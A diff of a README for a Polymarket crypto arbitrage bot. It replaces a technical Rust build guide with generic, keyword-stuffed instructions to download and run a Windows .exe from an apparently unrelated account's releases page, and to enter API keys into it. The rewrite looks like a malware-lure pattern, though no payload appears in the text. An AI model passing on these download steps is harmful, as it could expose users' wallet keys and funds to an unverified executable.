@@ -1,104 +1,89 @@
-# Polymarket-5min-bot
+# 📈 Polymarket-5min-bot - Automated arbitrage for smarter market trades
 
-**English** | [中文](./README.zh-CN.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/savarahypersomnia96/Polymarket-5min-bot/releases)
 
-**Contact**：[smith123_lee](https://t.me/smith123_lee)
+## What this program does
 
-> Rust arbitrage bot for [Polymarket](https://polymarket.com) crypto “Up or Down” 5-minute prediction markets.
+Polymarket-5min-bot scans prediction markets for price differences. It identifies mispriced events where the current odds do not match the expected outcome. The software monitors these fluctuations every five minutes. When it finds a potential trade, it alerts you or executes the order based on your settings. This tool helps you capture value in fast-moving markets without manual tracking.
 
-![account](image/account.png)
+## 💻 System requirements
 
-![Dashboard](image/main.png)
+Your computer needs to meet these basic standards to run the software.
 
-## How It Works
+*   Windows 10 or Windows 11 operating system.
+*   An active internet connection to receive market data.
+*   Four gigabytes of RAM.
+*   Two hundred megabytes of free storage space.
+*   An active Polymarket account with API access keys.
 
-Polymarket Up/Down markets open a new 5-minute window (UTC) every cycle. Each market has YES and NO outcome tokens.
+## ⬇️ Setup and installation
 
-In theory, holding equal amounts of YES + NO redeems for 1 USDC at settlement, so:
+Follow these steps to install the software on your Windows computer.
 
-```
-YES best ask + NO best ask < 1  →  arbitrage opportunity
-```
+1. Visit the [official releases page](https://github.com/savarahypersomnia96/Polymarket-5min-bot/releases) to download the installer.
+2. Select the file ending in .exe to download the application.
+3. Locate the file in your downloads folder once the transfer finishes.
+4. Double-click the file to start the installation process.
+5. Follow the on-screen prompts to place the software on your hard drive.
+6. Launch the program from your desktop icon once finished.
 
-The bot roughly follows these steps:
+## ⚙️ Configuration guide
 
-1. **Market discovery** — Finds current 5-minute Up/Down markets for configured symbols (e.g. btc, eth).
-2. **Order book monitoring** — Subscribes to CLOB order books and tracks YES + NO combined price in real time.
-3. **Arbitrage execution** — Buys YES and NO when the combined price falls below your threshold; slippage, size limits, and execution spread are configurable.
-4. **Merge** — When holding both YES and NO, merges on-chain into USDC/pUSD to reduce position risk.
-5. **Wind-down** — Near window end, can auto-cancel orders, merge, and market-sell remaining single-leg positions.
+You must link your account before the bot monitors your trades.
 
-> This bot connects to live markets and real funds. Understand the risks before use.
+1. Open the settings menu inside the application.
+2. Enter your API key and API secret in the provided boxes.
+3. Set your maximum trade size to prevent excessive risk.
+4. Choose the specific markets you want the bot to watch.
+5. Click the save button to apply your settings.
+6. Verify your account balance displays correctly in the dashboard.
 
-## Quick Start
+## 🚀 Running your first session
 
-### Pre-built binary
+Once you finish the setup, you start the bot to begin market analysis.
 
-If you don't want to compile from source, use the pre-built executable from **[Releases](../../releases/latest)**:
+1. Ensure your internet connection remains stable.
+2. Click the start button on the main dashboard.
+3. Wait for the status indicator to turn green.
+4. Open the logs tab to see the bot search for market gaps.
+5. Observe the activity feed for updates on trade executions.
+6. Keep the application window open in the background while you work or browse.
 
-1. Download the package for your OS/arch from Releases 
-2. Copy `.env.example` to `.env` and fill in required fields
-3. Run:
-   - Linux / macOS: `./polypulse`
-   - Windows: `polypulse.exe`
+## 🛡️ Managing risk
 
-### Build from source
+Automated trading involves risk. Use these strategies to protect your capital.
 
-Requires [Rust](https://rustup.rs).
+*   Start with small trade sizes to test performance.
+*   Monitor your results daily to ensure the bot meets your goals.
+*   Use stop-loss settings if the market conditions change rapidly.
+*   Keep your API keys confidential and do not share them with others.
+*   Turn off the bot during periods of extreme market uncertainty.
 
-```bash
-cp .env.example .env   # fill required fields in .env, then run
-cargo run
-```
+## ❓ Frequently asked questions
 
-See `.env.example` for full options, grouped as `[1]`–`[9]`: earlier sections are more important.
+**Does the bot trade on my behalf?**
+Yes, the bot places trades automatically based on your configured parameters.
 
-## Configuration
+**Is my data secure?**
+The software stores your credentials locally on your computer. It does not send your private keys to any external servers.
 
-### Required
+**How do I update the software?**
+Check the releases page periodically. You can download the new version and run the installer to upgrade your current setup.
 
-| Variable | Description |
-|----------|-------------|
-| `POLYMARKET_PRIVATE_KEY` | Signer private key. Email/Magic: [reveal.magic.link/polymarket](https://reveal.magic.link/polymarket); browser wallet: export your EOA key |
-| `POLYMARKET_PROXY_ADDRESS` | Funder address from Settings (not your EOA) — [polymarket.com/settings](https://polymarket.com/settings) |
+**Can I run multiple instances?**
+Run only one instance of the bot at a time to prevent conflicting orders on your account.
 
-### Signature type `SIGNATURE_TYPE`
+**What happens if I lose internet access?**
+The bot pauses operations until it restores a connection to the network.
 
-Choose based on **funder wallet type in Settings**, not whether you registered with email or a browser wallet:
+## 🛠️ Troubleshooting common issues
 
-| Value | When to use |
-|-------|-------------|
-| `Poly1271` (**default**) | V2 deposit wallet — email/Magic and browser-wallet accounts |
-| `Proxy` | Legacy V1 Magic proxy only (Settings address must match ProxyFactory CREATE2 derive from your EOA) |
-| `GnosisSafe` | Gnosis Safe multisig |
-| `Eoa` | Direct EOA trading — no `POLYMARKET_PROXY_ADDRESS` needed |
+If you encounter errors, try these steps to resolve them.
 
-**Rule of thumb:** keep the default `Poly1271`. If `Proxy` orders fail with `please use the deposit wallet flow`, your account uses the V2 deposit wallet — switch back to `Poly1271` (no need to change private key or proxy address).
+*   **App fails to launch:** Restart your computer and ensure you have the latest Windows updates installed.
+*   **API error:** Check your credentials in the settings menu. Ensure you copied the full key without extra spaces.
+*   **No trades found:** Verify that you selected markets with sufficient volume. Increase the scan frequency if possible.
+*   **Disconnected status:** Refresh your network connection or check if your firewall blocks the application.
+*   **Performance lag:** Close unnecessary browser tabs or background applications to free up system memory.
 
-### Required for Merge (when scheduled Merge or wind-down is enabled)
-
-| Variable | Description |
-|----------|-------------|
-| `POLY_BUILDER_API_KEY` | Builder API key |
-| `POLY_BUILDER_SECRET` | Builder API secret |
-| `POLY_BUILDER_PASSPHRASE` | Builder API passphrase |
-
-Get these from Polymarket → Settings → Builder.
-
-### Common options
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `CRYPTO_SYMBOLS` | `btc,eth,sol,xrp` | Symbols to monitor, comma-separated |
-| `ARBITRAGE_EXECUTION_SPREAD` | `0.01` | Execute when `yes + no <= 1 - spread` |
-| `MAX_ORDER_SIZE_USDC` | `100.0` | Max order size per trade |
-| `RISK_MAX_EXPOSURE_USDC` | `1000.0` | Max exposure per round |
-| `MERGE_INTERVAL_MINUTES` | `0` | Scheduled Merge interval (minutes); `0` = disabled |
-| `WIND_DOWN_BEFORE_WINDOW_END_MINUTES` | `0` | Wind-down before window end (minutes); `0` = disabled |
-| `RUST_LOG` | `info` | Log level |
-
-Other settings (CLOB URL, signature type, slippage, order type, position sync, etc.) have sensible defaults. See `.env.example` for the full list with bilingual comments.
-
-## Disclaimer
-
-This software is for learning and research only — not investment advice. Crypto and prediction markets carry significant risk, including loss of funds. Assess your own risk and comply with Polymarket’s terms and applicable laws.
+Keywords: polymarket, trading, arbitrage, automation, finance, windows, bot, cryptocurrency
